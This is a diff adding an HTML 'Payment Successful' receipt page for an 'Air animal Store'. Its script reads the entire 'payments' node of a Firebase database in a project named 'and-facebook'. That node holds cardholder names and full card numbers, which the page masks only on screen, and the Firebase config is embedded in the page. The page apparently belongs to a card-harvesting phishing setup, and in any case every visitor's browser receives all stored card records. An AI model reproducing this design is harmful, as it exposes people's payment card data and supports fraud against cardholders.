@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment Receipt</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f8f9fa;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background: #ffffff;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+        }
+        .icon {
+            font-size: 50px;
+            color: #28a745;
+        }
+        h1 {
+            color: #28a745;
+            margin: 10px 0;
+        }
+        table {
+            width: 100%;
+            margin-top: 20px;
+            border-collapse: collapse;
+        }
+        table td {
+            text-align: left;
+            padding: 8px;
+            border-bottom: 1px solid #e9ecef;
+        }
+        table td.label {
+            font-weight: bold;
+            color: #495057;
+        }
+        table td.value {
+            color: #6c757d;
+        }
+        button {
+            background: #28a745;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        button:hover {
+            background: #218838;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="icon">✔</div>
+        <h1>Payment Successful</h1>
+        
+        <p>Thank you for your payment. Below are your transaction details:</p>
+        <table>
+            <tr>
+                <td class="label">Transaction ID:</td>
+                <td class="value" id="transaction-id">Loading...</td>
+            </tr>
+            <tr>
+                <td class="label">Amount:</td>
+                <td class="value">$10.00</td>
+            </tr>
+            <tr>
+                <td class="label">Payment Method:</td>
+                <td class="value">Credit Card</td>
+            </tr>
+            <tr>
+                <td class="label">Cardholder Name:</td>
+                <td class="value" id="cardholder-name">Loading...</td>
+            </tr>
+            <tr>
+                <td class="label">Card Number:</td>
+                <td class="value" id="card-number">Loading...</td>
+            </tr>
+            <tr>
+                <td class="label">Transaction Date:</td>
+                <td class="value" id="transaction-date">Loading...</td>
+            </tr>
+            <tr>
+                <td class="label">Transaction Time:</td>
+                <td class="value" id="transaction-time">Loading...</td>
+            </tr>
+            <tr>
+                <td class="label">Merchant:</td>
+                <td class="value">Air animal Store</td>
+            </tr>
+        </table>
+        <button onclick="shareReceipt()">Share Receipt</button>
+    </div>
+
+    <!-- Firebase and JavaScript -->
+    <script type="module">
+        // Import Firebase modules
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
+        import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-database.js";
+
+        // Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyCcTFYAIp1-TA1irU8l5N8iihfnYCGWrHw",
+            authDomain: "and-facebook-ab84c.firebaseapp.com",
+            databaseURL: "https://and-facebook-ab84c-default-rtdb.firebaseio.com",
+            projectId: "and-facebook-ab84c",
+            storageBucket: "and-facebook-ab84c.appspot.com",
+            messagingSenderId: "4885749329",
+            appId: "1:4885749329:web:2d5b0e46519b5dc4c8e270"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
+        // Get the latest payment data
+        const paymentsRef = ref(db, 'payments');
+        onValue(paymentsRef, (snapshot) => {
+            const payments = snapshot.val();
+
+            if (payments) {
+                // Get the latest payment by sorting keys
+                const latestKey = Object.keys(payments).sort().reverse()[0];
+                const latestPayment = payments[latestKey];
+
+                // Update the receipt with payment details
+                document.getElementById('transaction-id').textContent = latestKey;
+                document.getElementById('cardholder-name').textContent = latestPayment.cardholderName || 'N/A';
+                
+                // Mask the card number, showing only the last 4 digits
+                const cardNumber = latestPayment.cardNumber || '';
+                document.getElementById('card-number').textContent = cardNumber.replace(/.(?=.{4})/g, '*');
+
+                // Set transaction date and time
+                const now = new Date();
+                document.getElementById('transaction-date').textContent = now.toLocaleDateString();
+                document.getElementById('transaction-time').textContent = now.toLocaleTimeString();
+            } else {
+                alert('No payment data found.');
+            }
+        }, (error) => {
+            alert('Failed to load payment information: ' + error.message);
+        });
+
+        // Share Receipt Functionality
+        function shareReceipt() {
+            if (navigator.share) {
+                navigator.share({
+                    title: 'Payment Receipt',
+                    text: 'Your payment was successful. Check your receipt!',
+                    url: window.location.href,
+                })
+                .then(() => console.log('Receipt shared successfully.'))
+                .catch(error => console.error('Error sharing receipt:', error));
+            } else {
+                alert('Sharing not supported on this browser.');
+            }
+        }
+    </script>
+</body>
+</html>
